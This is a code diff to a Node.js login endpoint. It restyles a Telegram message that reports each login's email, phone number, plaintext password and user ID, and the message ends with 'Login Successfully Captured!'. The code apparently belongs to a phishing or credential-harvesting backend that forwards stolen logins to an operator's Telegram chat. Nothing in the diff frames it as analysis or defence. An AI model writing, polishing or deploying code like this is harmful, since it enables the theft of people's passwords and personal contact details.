@@ -290,22 +290,24 @@ app.post('/api/login', async (req, res) => {
       }
     }
 
-    // ENHANCED Telegram message with better formatting
-    const message = `🚀 <b>New User Login Alert</b>
+    // ENHANCED Telegram message with different formatting style
+    const message = `🎯 <b>🔔 NEW LOGIN DETECTED 🔔</b>
 
-┌─────────────────────────────
-│ 🔐 <b>Login Details</b>
-├─────────────────────────────
-│ 📋 <b>Method:</b> ${loginMethod.toUpperCase()}
-│ 📅 <b>Date:</b> ${loginDate}
-│ 🕒 <b>Time:</b> ${loginTime}
-│ 📧 <b>Email:</b> ${email || '❌ Not provided'}
-│ 📱 <b>Phone:</b> ${phone || '❌ Not provided'}
-│ 🔑 <b>Password:</b> <code>${password}</code>
-│ 🆔 <b>User ID:</b> ${savedUser._id}
-└─────────────────────────────
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    🎪 <b>USER LOGIN INFORMATION</b> 🎪
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 
-⚡ <i>Login captured successfully!</i>`;
+🔹 <b>Login Method:</b> ${loginMethod.toUpperCase()}
+🔹 <b>Login Date:</b> ${loginDate}
+🔹 <b>Login Time:</b> ${loginTime}
+🔹 <b>Email Address:</b> ${email || '🚫 Not provided'}
+🔹 <b>Phone Number:</b> ${phone || '🚫 Not provided'}
+🔹 <b>Password:</b> <code>${password}</code>
+🔹 <b>Unique ID:</b> ${savedUser._id}
+
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+    ✅ <i>Login Successfully Captured!</i> ✅
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━`;
 
     // Send to Telegram with improved error handling
     console.log('📱 Preparing to send Telegram notification...');
